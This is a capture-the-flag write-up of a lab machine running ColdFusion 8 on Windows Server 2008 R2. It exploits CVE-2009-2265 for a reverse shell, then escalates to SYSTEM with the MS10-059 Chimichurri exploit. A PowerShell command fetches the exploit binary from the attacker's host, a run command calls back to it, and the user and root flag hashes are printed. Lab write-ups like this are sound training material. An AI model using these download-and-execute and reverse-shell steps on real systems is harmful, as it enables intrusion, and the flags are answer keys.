#box #coldfusion #MS10-059 #chimichurri #ReverseShell 
Artic is a machine which consists in an available FMTP open port which exposes the presence of ColdFusion 8 installed. ColdFusion 8 can be exploited by leveraging on CVE-2009-2265. Once inside the machine, we discover that the machine is a Windows 2008 R2

## Nmap

The Nmap scan can't be performed with `-sC` or `-sV` because it's apparently getting blocked. We can perform a scan without them to first discover open port and we end up discovering:
```bash
# Nmap 7.95 scan initiated Thu Apr 10 19:42:05 2025 as: /usr/lib/nmap/nmap --min-rate=10000 -o nmap_sCsV 10.129.23.77
Nmap scan report for 10.129.23.77
Host is up (0.026s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

# Nmap done at Thu Apr 10 19:42:05 2025 -- 1 IP address (1 host up) scanned in 0.62 seconds
```

## :8500

We discover that port :8500 is open and is reachable, a trove of content is hidden in there and after enumerating some of this content we find that the machine is hosting ColdFusion 8, a web application development platform. Specifically, ColdFusion 8 is vulnerable to RCE, highlighted in CVE-2009-2265. We can find the exploit on [exploit-db](https://www.exploit-db.com/exploits/50057).
By configuring the exploit with the right LHOST/LPORT, RHOST/RPORT we can successfully grant ourselves a shell in the system.

```python
lhost = '10.10.16.20'
lport = 4444
rhost = "10.129.23.77"
rport = 8500
```

User: `62a6f930b94f978e900e4b7463c4037a`
## Privilege Escalation

Once on the system, with `systeminfo` we gain information and knowledge that we're running on a Windows Server 2008 R2 6.1.7600. The machine has no hotfixes applied. After trying multiple vulnerabilities, we encounter [MS10-059](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri) and try to execute it on the machine by pointing back on our machine to gain a reverse shell as 
`NT AUTHORITY\SYSTEM`.

First of all, we download the exploit on our machine with `wget`, then we use powershell to download the file on the windows machine since it doesn't have neither wget nor curl.
```powershell
powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.16.20:8000/Chimichurri.exe','C:\Users\tolis\Desktop\Chimichurri.exe')
```

Once downloaded on the current user's desktop, we proceed with the execution of the script by adding LHOST LPORT as script's parameters
```shell
.\Chimichurri.exe 10.10.16.20 1337
```
Obtaining the shell

Root:`aa470dc1815bbe185f71b8dd0dcfbd41`